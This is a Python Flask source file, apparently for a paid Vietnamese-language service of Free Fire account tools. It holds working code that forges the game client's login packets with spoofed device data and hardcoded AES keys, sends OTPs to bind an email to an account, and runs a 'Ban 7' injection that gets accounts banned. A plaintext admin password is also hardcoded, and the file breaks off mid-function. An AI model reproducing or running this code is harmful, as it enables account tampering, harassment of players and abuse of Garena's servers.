
def decode_jwt(token: str) -> dict:
    parts = token.split(".")
    if len(parts) < 2: return {}
    p = parts[1] + "=" * (-len(parts[1]) % 4)
    try:
        payload = json.loads(base64.urlsafe_b64decode(p).decode())
        if "nickname" in payload and isinstance(payload["nickname"], str):
            payload["nickname"] = decode_nickname(payload["nickname"])
        return payload
    except: return {}

def convert_time(seconds):
    d, s = divmod(int(seconds), 86400)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    return f"{d}d {h}h {m}m {s}s"

GARENA_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

def send_otp(email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    data = {"email": email, "locale": "en_MA", "region": "IND",
            "app_id": "100067", "access_token": access_token}
    try:
        return requests.post(url, headers=GARENA_HEADERS, data=data)
    except Exception as e:
        return None

def verify_otp(otp, email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    data = {"app_id": "100067", "access_token": access_token, "otp": otp, "email": email}
    return requests.post(url, data=data, headers=GARENA_HEADERS)

def cancel_request(access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': access_token}
    try: requests.post(url, data=payload, headers=GARENA_HEADERS)
    except: pass

def extract_eat_from_input(raw: str) -> str:
    raw = raw.strip()
    if raw.startswith('http'):
        m = re.search(r'[?&]eat=([a-fA-F0-9]+)', raw)
        if m: return m.group(1)
    return raw

def eat_to_access(eat_token: str) -> str:
    TARGET = "https://api-otrss.garena.com/support/callback/"
    session = requests.Session()
    resp = session.get(TARGET, params={'access_token': eat_token}, allow_redirects=False)
    while resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get('Location', '')
        if not location: break
        if not location.startswith(('http://', 'https://')):
            base = urlparse(TARGET)
            location = base._replace(path=location).geturl()
        resp = session.get(location, allow_redirects=False)
    parsed = urlparse(resp.url)
    params = parse_qs(parsed.query)
    return params.get('access_token', [None])[0]

def build_login_payload(open_id: str, access_token: str, platform: int) -> bytes:
    now = str(datetime.now())[:19]
    pl = bytearray()
    pl += _str_field(3,  now)
    pl += _str_field(22, open_id)
    pl += _str_field(23, str(platform))
    pl += _str_field(29, access_token)
    pl += _str_field(99, str(platform))
    return bytes(pl)

def build_login_packet_from_jwt(jwt_token: str, key, iv) -> bytes:
    payload = decode_jwt(jwt_token)
    acc_id = int(payload.get('account_id', 0))
    exp = int(payload.get('exp', 0))
    exp_adj = max(exp - 28800, 0)
    
    enc_token = aes_encrypt(jwt_token.encode(), key, iv)
    body_len  = len(enc_token)
    
    acc_hex      = acc_id.to_bytes(8, "big").hex()
    time_hex     = exp_adj.to_bytes(4, "big").hex()
    body_len_hex = body_len.to_bytes(4, "big").hex()
    header_hex = "0115" + acc_hex + time_hex + body_len_hex
    return bytes.fromhex(header_hex) + enc_token

def parse_duration(duration_str: str) -> int:
    """Parse duration string like '1d:2h:30m:10s' to seconds"""
    total = 0
    parts = duration_str.split(':')
    for part in parts:
        if part.endswith('d'):
            total += int(part[:-1]) * 86400
        elif part.endswith('h'):
            total += int(part[:-1]) * 3600
        elif part.endswith('m'):
            total += int(part[:-1]) * 60
        elif part.endswith('s'):
            total += int(part[:-1])
        else:
            total += int(part)
    return total

def _varint(v):
    r = bytearray()
    while v > 0x7F:
        r.append((v & 0x7F) | 0x80); v >>= 7
    r.append(v); return bytes(r)

def _int_field(f, v):
    return _varint((f << 3) | 0) + _varint(v)

def _str_field(f, v):
    if isinstance(v, str): v = v.encode()
    return _varint((f << 3) | 2) + _varint(len(v)) + v

# ---------------- SimpleProtobuf Class for Ban 7 ---------------- #
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)   

    @staticmethod
    def decode_varint(data, start_index=0):
        value = 0
        shift = 0
        index = start_index
        while index < len(data):
            byte = data[index]
            index += 1
            value |= (byte & 0x7F) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return value, index    

    @staticmethod
    def parse_protobuf(data):
        result = {}
        index = 0        
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1            
            if wire_type == 0:
                value, index = SimpleProtobuf.decode_varint(data, index)
                result[field_num] = value
            elif wire_type == 2:
                length, index = SimpleProtobuf.decode_varint(data, index)
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        result[field_num] = value_bytes.decode('utf-8')
                    except:
                        result[field_num] = value_bytes
            else:
                break
        
        return result    

    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')        
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        result.extend(SimpleProtobuf.encode_varint(len(value)))
        result.extend(value)
        return bytes(result)   

    @staticmethod
    def encode_int32(field_number, value):
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
        result.extend(SimpleProtobuf.encode_varint(value))
        return bytes(result)   

    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        p = str(platform)
        random_ip = f"1{random.randint(0,9)}{random.randint(0,9)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        random_device = f"Google|{str(uuid.uuid4())}"

        payload = bytearray()
        payload.extend(SimpleProtobuf.encode_string(3,  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        payload.extend(SimpleProtobuf.encode_string(4,  "free fire"))
        payload.extend(SimpleProtobuf.encode_int32 (5,  4))
        payload.extend(SimpleProtobuf.encode_string(7,  "1.123.1"))
        payload.extend(SimpleProtobuf.encode_string(8,  "Android OS 11 / API-30 (RP1A.200720.012/G991BXXU3AUL1)"))
        payload.extend(SimpleProtobuf.encode_string(9,  "Handheld"))
        payload.extend(SimpleProtobuf.encode_string(10, "vn"))
        payload.extend(SimpleProtobuf.encode_string(11, "WIFI"))
        payload.extend(SimpleProtobuf.encode_int32 (12, 2400))
        payload.extend(SimpleProtobuf.encode_int32 (13, 1080))
        payload.extend(SimpleProtobuf.encode_string(14, "560"))
        payload.extend(SimpleProtobuf.encode_string(15, "ARM64 FP ASIMD AES | 8192 | 8"))
        payload.extend(SimpleProtobuf.encode_int32 (16, 3328))
        payload.extend(SimpleProtobuf.encode_string(17, "Adreno (TM) 640"))
        payload.extend(SimpleProtobuf.encode_string(18, "OpenGL ES 3.2 V@0490.0 (GIT@f51fd3a, Ia8bab3e8c8, 1602597876) (Date:10/13/20)"))
        payload.extend(SimpleProtobuf.encode_string(19, random_device))
        payload.extend(SimpleProtobuf.encode_string(20, random_ip))
        payload.extend(SimpleProtobuf.encode_string(21, "en"))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, p))
        payload.extend(SimpleProtobuf.encode_string(24, "Handheld"))
        payload.extend(SimpleProtobuf.encode_string(25, "samsung SM-G991B"))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_int32 (30, 1))
        payload.extend(SimpleProtobuf.encode_string(41, "vn"))
        payload.extend(SimpleProtobuf.encode_string(42, "WIFI"))
        payload.extend(SimpleProtobuf.encode_string(57, "4a10243f7968f0b4bea6b7c7c678e6fa"))
        payload.extend(SimpleProtobuf.encode_int32 (60, 2019120270))
        payload.extend(SimpleProtobuf.encode_int32 (61, 1424))
        payload.extend(SimpleProtobuf.encode_int32 (62, 3349))
        payload.extend(SimpleProtobuf.encode_int32 (63, 24))
        payload.extend(SimpleProtobuf.encode_int32 (64, 1552))
        payload.extend(SimpleProtobuf.encode_int32 (65, 2019120270))
        payload.extend(SimpleProtobuf.encode_int32 (66, 1552))
        payload.extend(SimpleProtobuf.encode_int32 (67, 2019120270))
        payload.extend(SimpleProtobuf.encode_int32 (73, 1))
        payload.extend(SimpleProtobuf.encode_string(74, "/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/lib/arm64"))
        payload.extend(SimpleProtobuf.encode_int32 (76, 2))
        payload.extend(SimpleProtobuf.encode_string(77, "4a10243f7968f0b4bea6b7c7c678e6fa|/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefireth-i72Sh_-sI0zZHs5Bw6aufg==/base.apk"))
        payload.extend(SimpleProtobuf.encode_int32 (78, 2))
        payload.extend(SimpleProtobuf.encode_int32 (79, 2))
        payload.extend(SimpleProtobuf.encode_string(81, "64"))
        payload.extend(SimpleProtobuf.encode_string(83, "2019120270"))
        payload.extend(SimpleProtobuf.encode_int32 (85, 1))
        payload.extend(SimpleProtobuf.encode_string(86, "OpenGLES3"))
        payload.extend(SimpleProtobuf.encode_int32 (87, 16383))
        payload.extend(SimpleProtobuf.encode_int32 (88, 4))
        payload.extend(SimpleProtobuf.encode_string(90, "HoChiMinh"))
        payload.extend(SimpleProtobuf.encode_string(91, "VN"))
        payload.extend(SimpleProtobuf.encode_int32 (92, 70000))
        payload.extend(SimpleProtobuf.encode_string(93, "android"))
        payload.extend(SimpleProtobuf.encode_string(94, "MIIFhjCCA26gAwIBAgIUVCQdTKC364qgxvKKn15UMOLnM0wwDQYJKoZIhvcNAQELBQAwdDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC0dvb2dsZSBJbmMuMRAwDgYDVQQLEwdBbmRyb2lkMRAwDgYDVQQDEwdBbmRyb2lkMB4XDTE3MDkyODEwMDgyNloXDTQ3MDkyODEwMDgyNlowdDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC0dvb2dsZSBJbmMuMRAwDgYDVQQLEwdBbmRyb2lkMRAwDgYDVQQDEwdBbmRyb2lkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvylTyLEk6kqvaTtO+5+GW/sQ8P2yhsXpDiuRSQis56yl8UMR8mx8roLnnTU/mv8sKBf8Y811Z5BBBTaty/305IMnx5Exl/fE30atgemNjt66wGFio1wT1qhTPgK1qZYRTBpGIAcADd1g6xfw5ujF00XfzeOQBRWmYPioCpWI9tK+VayHk6jU09I9Y1TNUz5D76X4y7WQjIotpFRP8y9dzZJPG7Nh+RYbQdW2RxD10NITD6FQdRanWFRJP5YCQEMN/SGGdPnfCetDxXLwSVGdTfsWwTWrYBueMTUlFBSZDgSt8MXW1R9bF5UUEiz74OiZNONhx1LRrydyTDC3O/K0LaJ8d6s+Dyfonq4bRF4UQ0C/tQtJtz5XTkmY9wsscLekZ+TDwHKEP0m0j7pktBq54Bdr+TNPlyQ/NaWr4SeKiLbFEDfIPy5XoOcJX3anIjw4sm2xPr4YST8zDcnNFiq4RkMdOyyumxapasD0JSTslQu1MjLBH7S1QdNLIU+EByyjd5X9wtLww40jHxcPLUihb0glIJTg6YTWKDIg9dcJ/gc7uSSaqjG8cX86wBTaleV32x+gYtFxy4SNIEiwevP0zFirhTcQ7eJvfDvtyMqnpDUHzvTmvddyekQuWOr2Lmh0ZnBWb8H93heQcrr7gOUgi/DZS6MwMRK8fy6nQT39RzsCAwEAAaMQMA4wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEAP+WSvrwEWPjLMWyIB8KfPjkWMgPf+6/SWhw1Yj0Fnoo430rcmDw9YHInJXvDxW8gSOfxxzKzENLFQEQl08K7htiEI7lDPHqdrjV615cV+tzrTM5mX4i0jbZ3zKDBrY8pHbzvrPuaZm5Nk4N06L+jsLDkzPq/gUKdGLSjiYK32asOduq4ILNlh2QFJkQm/cFZw71c+UWNDiLQ2PX1644e9/Akzh5X4X2lMA4yAGWDRhFFzbdDCGlsUkD/3qxvN1O3k82YIzYQKrpN9c9J3lvnDDKzpwNptZRLB+mWej637FWrByRygbxzqAjtfhPoGW7Kd6vvRtvVGlyCJzYMMhtZPnmHRqCaGzo9MKh+9IICDCDWt4u2HR4QcYCAsZeCJE3gkP4vnqLp3y2BqOisZHgIB94MlUeTzJOLLHY+jIdr9sKDGvtgy5FHwdd8aCHxRvjNF2W/oDnWX7mVPcwueGbToEszvoP0hbEqgJIOHGGgLIjQ7+0gqkT/az3owaP/KNRtkDpoRXCA8aSCjC+UyY01qnj/rS4l9IAxIthSqf6BYEUWnL53KpQWuYVHq5CNEjjnM/0LKIvTh1wIDQCCtfn9Hwp6cud2LYafRKgOZekqb/UlZGf/LJ1vkBKvIr48xLRCDHeRW5kuPFBZISMfSR/KRjIQTCn07fbXunufqeJ868c="))
        payload.extend(SimpleProtobuf.encode_int32 (97, 1))
        payload.extend(SimpleProtobuf.encode_int32 (98, 1))
        payload.extend(SimpleProtobuf.encode_string(99,  p))
        payload.extend(SimpleProtobuf.encode_string(100, p))
        payload.extend(SimpleProtobuf.encode_string(102, ""))
        return bytes(payload)

def b64url_decode(input_str: str) -> bytes:
    rem = len(input_str) % 4
    if rem:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def get_available_room(input_text):
    try:
        data = bytes.fromhex(input_text)
        result = {}
        index = 0
        
        while index < len(data):
            if index >= len(data):
                break                
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1            
            if wire_type == 0:
                value = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    value |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"wire_type": "varint", "data": value}                
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7                
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        value_str = value_bytes.decode('utf-8')
                        result[str(field_num)] = {"wire_type": "string", "data": value_str}
                    except:
                        result[str(field_num)] = {"wire_type": "bytes", "data": value_bytes.hex()}
            else:
                break                
        return json.dumps(result)
    except Exception as e:
        return None

def extract_jwt_payload_dict(jwt_s: str):
    try:
        parts = jwt_s.split('.')
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        payload_bytes = b64url_decode(payload_b64)
        payload = json.loads(payload_bytes.decode('utf-8', errors='ignore'))
        if isinstance(payload, dict):
            return payload
    except Exception:
        pass
    return None

def encrypt_packet(hex_string: str, aes_key, aes_iv) -> str:
    if isinstance(aes_key, str):
        aes_key = bytes.fromhex(aes_key)
    if isinstance(aes_iv, str):
        aes_iv = bytes.fromhex(aes_iv)   
    data = bytes.fromhex(hex_string)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted.hex()

def build_start_packet(account_id: int, timestamp: int, jwt: str, key, iv) -> str:
    try:
        encrypted = encrypt_packet(jwt.encode().hex(), key, iv)
        head_len = hex(len(encrypted) // 2)[2:]
        ide_hex = hex(int(account_id))[2:]
        zeros = "0" * (16 - len(ide_hex))
        timestamp_hex = hex(timestamp)[2:].zfill(2)
        head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}"
        start_packet = head + encrypted
        
        return start_packet
    except Exception as e:
        return None

def send_once(remote_ip, remote_port, payload_bytes, recv_timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(recv_timeout)
    try:
        s.connect((remote_ip, remote_port))
        s.sendall(payload_bytes)
        
        chunks = []
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        return b"".join(chunks)
    finally:
        s.close()

def process_login(access_token):
    try:
        # Step 1: Inspect token
        inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
        inspect_headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100067.connect.garena.com",
            "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
        }

        try:
            resp = requests.get(inspect_url, headers=inspect_headers, timeout=10)
            data = resp.json()
            if 'error' in data:
                return {"success": False, "message": f"Token error: {data.get('error')}"}
        except Exception as e:
            return {"success": False, "message": f"Failed to inspect token: {str(e)}"}

        NEW_OPEN_ID = data.get('open_id')
        platform_ = data.get('platform')

        # Step 2: MajorLogin
        key = b'Yg&tc%DEuh6%Zc^8'
        iv = b'6oyZDr22E3ychjM%'
        MajorLogin_url = "https://loginbp.ggpolarbear.com/MajorLogin"
        MajorLogin_headers = {
            "Host": "loginbp.ggpolarbear.com",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/octet-stream",
            "Expect": "100-continue",
            "X-GA": "v1 1",
            "X-Unity-Version": "2018.4.11f1",
            "ReleaseVersion": "OB54"
        }

        data_pb = SimpleProtobuf.create_login_payload(NEW_OPEN_ID, access_token, str(platform_))
        data_padded = pad(data_pb, 16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc_data = cipher.encrypt(data_padded)

        try:
            response = requests.post(MajorLogin_url, headers=MajorLogin_headers, data=enc_data, timeout=15)
            # Show Debug
#            print(f"[D6] status: {response.status_code}")
#            print(f"[D7] response headers: {dict(response.headers)}")
#            print(f"[D8] response body hex: {response.content.hex()}")
#            print(f"[D9] response body text: {response.text}")
            if not response.ok:
                return {"success": False, "message": f"MajorLogin error: {response.status_code}"}
        except Exception as e:
            return {"success": False, "message": f"MajorLogin failed: {str(e)}"}

        # Step 3: Parse MajorLogin response
        resp_enc = response.content
        cipher_resp = AES.new(key, AES.MODE_CBC, iv)
        resp_msg = MajorLogin_res_pb2.MajorLoginRes()
        parsed_data = None

        try:
            resp_dec = unpad(cipher_resp.decrypt(resp_enc), 16)
            resp_msg.ParseFromString(resp_dec)
            parsed_data = SimpleProtobuf.parse_protobuf(resp_dec)
        except Exception:
            resp_msg.ParseFromString(resp_enc)
            parsed_data = SimpleProtobuf.parse_protobuf(resp_enc)

        # Get timestamp
        field_21_value = parsed_data.get(21, None)
        if field_21_value:
            ts = Timestamp()
            ts.FromNanoseconds(field_21_value)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos
        else:
            payload = extract_jwt_payload_dict(resp_msg.account_jwt)
            exp = int(payload.get("exp", 0))
            ts = Timestamp()
            ts.FromNanoseconds(exp * 1_000_000_000)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos

        # Step 4: GetLoginData
        GetLoginData_resURL = "https://clientbp.ggpolarbear.com/GetLoginData"
        GetLoginData_res_headers = {
            'Expect': '100-continue',
            'Authorization': f'Bearer {resp_msg.account_jwt}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA': 'v1 1',
            'ReleaseVersion': 'OB54',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)',
            'Host': 'clientbp.ggpolarbear.com',
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate, br',
        }

        try:
            r2 = requests.post(GetLoginData_resURL, headers=GetLoginData_res_headers, data=enc_data, timeout=12, verify=False)
            if r2.status_code != 200:
                return {"success": False, "message": f"GetLoginData error: {r2.status_code}"}
        except Exception as e:
            return {"success": False, "message": f"GetLoginData failed: {str(e)}"}

        # Step 5: Parse server address
        online_ip = None
        online_port = None

        try:
            x = r2.content.hex()
            json_result = get_available_room(x)

            if json_result:
                parsed_data_login = json.loads(json_result)
                if '14' in parsed_data_login and 'data' in parsed_data_login['14']:
                    online_address = parsed_data_login['14']['data']
                    parts = online_address.rsplit(":", 1)
                    online_ip = parts[0]
                    online_port = int(parts[1])
                else:
                    return {"success": False, "message": "Could not find server address"}
            else:
                return {"success": False, "message": "Failed to parse GetLoginData response"}
        except Exception as e:
            return {"success": False, "message": f"Error processing response: {str(e)}"}

        # Step 6: Build and send packet
        payload_jwt = extract_jwt_payload_dict(resp_msg.account_jwt)
        if payload_jwt is None:
            return {"success": False, "message": "Failed to decode JWT"}

        account_id = int(payload_jwt.get("account_id", 0))
        final_token_hex = build_start_packet(
            account_id=account_id,
            timestamp=timetamp,
            jwt=resp_msg.account_jwt,
            key=resp_msg.key,
            iv=resp_msg.iv)

        if not final_token_hex:
            return {"success": False, "message": "Failed to build packet"}

        try:
            payload_bytes = bytes.fromhex(final_token_hex)
            response = send_once(online_ip, online_port, payload_bytes, recv_timeout=5.0)
            if response:
                return {"success": True,"account_id":account_id,"open_id":NEW_OPEN_ID,"platform": platform_,"data": response.hex(),"Dev": "@vhhh1"}
            else:
                return {"success": False, "message": "No response from server"}
        except Exception as e:
            return {"success": False, "message": f"Connection error: {str(e)}"}

    except Exception as e:
        return {"success": False, "message": f"Unexpected error: {str(e)}"}

# Admin Dashboard Password (hashed)
ADMIN_PASSWORD_HASH = hashlib.sha256("MtAdmin@2026!".encode()).hexdigest()

def check_tool_pro(username, tool_name):
    """Check if user has Pro access to a specific tool"""
    return True

@app.route('/api/activate_key', methods=['POST'])
def activate_key():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập'})

        data = request.json
        key_code = data.get('key_code')
        username = session.get('username')

        if not key_code:
            return jsonify({'success': False, 'error': 'Vui lòng nhập Key'})

        key_data = firebase_get(f'/keys/{key_code}')
        if not key_data:
            return jsonify({'success': False, 'error': 'Key không tồn tại'})

        if key_data.get('is_used'):
            return jsonify({'success': False, 'error': 'Key đã được sử dụng'})

        target_tool = key_data.get('tool_name')
        if not target_tool:
            return jsonify({'success': False, 'error': 'Key không hợp lệ (thiếu thông tin tính năng)'})

        # Activate for user
        activation_data = {
            'is_lifetime': key_data.get('is_lifetime'),
            'expiry': key_data.get('expiry'),
            'activated_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        if target_tool == 'all':
            # Global Pro
            firebase_update(f'/usage/{username}', {'is_pro': True})
            firebase_update(f'/users/{username}', {'is_pro': True})
            msg = "Kích hoạt gói PRO toàn diện thành công!"
        else:
            # Specific tool Pro
            firebase_update(f'/user_pro_tools/{username}', {target_tool: activation_data})
            tool_display_name = "Ban 7 Ngày" if target_tool == 'ban7' else "Spam Log" if target_tool == 'spam_log' else target_tool
            msg = f"Kích hoạt Pro cho tính năng {tool_display_name} thành công!"

        firebase_update(f'/keys/{key_code}', {'is_used': True, 'used_by': username, 'used_at': activation_data['activated_at']})

        return jsonify({'success': True, 'message': msg})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Admin APIs
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login2():
    if request.method == 'POST':
        password = request.form.get('password')
        if hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD_HASH:
            session['admin_authenticated'] = True
            return redirect('/dashboard')
        return render_template('admin_login.html', error="Mật khẩu không đúng")
    return render_template('admin_login.html')

@app.route('/dashboard')
def dashboard():
    # Kiểm tra cả 2 session để đảm bảo không bị lỗi văng ra ngoài
    if not session.get('admin_authenticated') and not session.get('admin_logged_in'):
        return redirect('/admin/login')
    return render_template('dashboard.html')

@app.route('/api/admin/get_users', methods=['GET'])
def admin_get_users():
    if not session.get('admin_authenticated'):
        return jsonify({'success': False, 'error': 'Unauthorized'})
    users = firebase_get('/users')
    usages = firebase_get('/usage')
    pro_tools = firebase_get('/user_pro_tools')
    return jsonify({'success': True, 'users': users, 'usages': usages, 'pro_tools': pro_tools})

@app.route('/api/admin/update_user', methods=['POST'])
def admin_update_user():
    if not session.get('admin_authenticated'):
        return jsonify({'success': False, 'error': 'Unauthorized'})
    data = request.json
    username = data.get('username')
    new_data = data.get('new_data') # email, is_pro, etc.
    new_password = data.get('new_password')

    if new_password:
        new_data['password'] = hashlib.sha256(new_password.encode()).hexdigest()

    firebase_update(f'/users/{username}', new_data)
    if 'is_pro' in new_data:
        firebase_update(f'/usage/{username}', {'is_pro': new_data['is_pro']})

    return jsonify({'success': True, 'message': 'Cập nhật người dùng thành công'})

@app.route('/api/admin/delete_user', methods=['POST'])
def admin_delete_user():
    if not session.get('admin_authenticated'):
        return jsonify({'success': False, 'error': 'Unauthorized'})
    username = request.json.get('username')
    requests.delete(f"{FIREBASE_URL}/users/{username}.json?auth={FIREBASE_SECRET}")
    requests.delete(f"{FIREBASE_URL}/usage/{username}.json?auth={FIREBASE_SECRET}")
    requests.delete(f"{FIREBASE_URL}/user_pro_tools/{username}.json?auth={FIREBASE_SECRET}")
    return jsonify({'success': True, 'message': 'Xóa người dùng thành công'})

@app.route('/api/admin/create_key', methods=['POST'])
def admin_create_key():
    if not session.get('admin_authenticated'):
        return jsonify({'success': False, 'error': 'Unauthorized'})
    data = request.json
    tool_name = data.get('tool_name')
    is_lifetime = data.get('is_lifetime', False)
    expiry = data.get('expiry') # YYYY-MM-DD HH:MM:SS

    key_code = "KEY-" + str(uuid.uuid4())[:8].upper() + "-" + str(random.randint(1000, 9999))
    key_data = {
        'tool_name': tool_name,
        'is_lifetime': is_lifetime,
        'expiry': expiry,
        'is_used': False,
        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    firebase_set(f'/keys/{key_code}', key_data)
    return jsonify({'success': True, 'key': key_code})

@app.route('/api/admin/get_keys', methods=['GET'])
def admin_get_keys():
    if not session.get('admin_authenticated'):
        return jsonify({'success': False, 'error': 'Unauthorized'})
    keys = firebase_get('/keys')
    return jsonify({'success': True, 'keys': keys})

@app.route('/api/admin/delete_key', methods=['POST'])
def admin_delete_key():
    if not session.get('admin_authenticated'):
        return jsonify({'success': False, 'error': 'Unauthorized'})
    key_code = request.json.get('key_code')
    requests.delete(f"{FIREBASE_URL}/keys/{key_code}.json?auth={FIREBASE_SECRET}")
    return jsonify({'success': True, 'message': 'Xóa Key thành công'})

@app.route('/api/admin/update_key', methods=['POST'])
def admin_update_key():
    if not session.get('admin_authenticated'):
        return jsonify({'success': False, 'error': 'Unauthorized'})
    data = request.json
    key_code = data.get('key_code')
    new_data = data.get('new_data')
    firebase_update(f'/keys/{key_code}', new_data)
    return jsonify({'success': True, 'message': 'Cập nhật Key thành công'})

def trigger_ban7_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BAN7_BODY_BASE64)
    try:
        return requests.post(BAN7_API_URL, headers=headers, data=body, timeout=20, verify=False)
    except:
        return None

@app.route('/api/ban7', methods=['POST'])
def ban7():
    try:
        # Check if user is logged in
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')

        # Check usage limit (1 use for all users)
        usage = get_user_usage(username)
        if usage.get('ban7', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        access_token = data.get('access_token')
        
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token là bắt buộc'})

        # Step 1: Get JWT
        try:
            open_id, platform = inspect_token(access_token)
            jwt_token, _, _ = do_major_login(open_id, access_token, platform)
        except Exception as e:
            error_msg = str(e)
            if "Token đã hết hạn" in error_msg:
                return jsonify({'success': False, 'error': error_msg})
            return jsonify({'success': False, 'error': f'Xác thực thất bại: {error_msg}'})

        user_data = decode_jwt(jwt_token)
        nickname = user_data.get('nickname', 'Unknown')
        version = user_data.get('release_version', 'OB54')
        
        # Trigger injection once
        resp = trigger_ban7_injection(jwt_token, version)
        
        if resp and resp.status_code == 200:
            update_user_usage(username, 'ban7')
            return jsonify({
                'success': True,
                'message': 'Đã gửi lệnh Ban 7 ngày thành công (Injection Triggered)',
                'nickname': nickname,
                'account_id': user_data.get('account_id'),
                'region': user_data.get('region', 'IND')
            })
        else:
            status_code = resp.status_code if resp else 'No response'
            return jsonify({'success': False, 'error': f'Gửi lệnh thất bại. Mã phản hồi: {status_code}'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def save_task(task_id, task_data):
    """Save task to tasks.json"""
    try:
        if os.path.exists('tasks.json'):
            with open('tasks.json', 'r') as f:
                tasks = json.load(f)
        else:
            tasks = []
    except:
        tasks = []
    
    tasks.append(task_data)
    
    with open('tasks.json', 'w') as f:
        json.dump(tasks, f, indent=2)
    
    return task_id

def get_task_status(task_id):
    """Get task status from tasks.json"""
    try:
        with open('tasks.json', 'r') as f:
            tasks = json.load(f)
        
        for task in tasks:
            if task.get('task_id') == task_id:
                return task
        return None
    except:
        return None

def update_task_status(task_id, status, result=None):
    """Update task status in tasks.json"""
    try:
        with open('tasks.json', 'r') as f:
            tasks = json.load(f)
    except:
        return False
    
    for task in tasks:
        if task.get('task_id') == task_id:
            task['status'] = status
            if result:
                task['result'] = result
            task['updated_at'] = datetime.now().isoformat()
            break
    
    with open('tasks.json', 'w') as f:
        json.dump(tasks, f, indent=2)
    
    return True

def inspect_token(access_token: str):
    url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
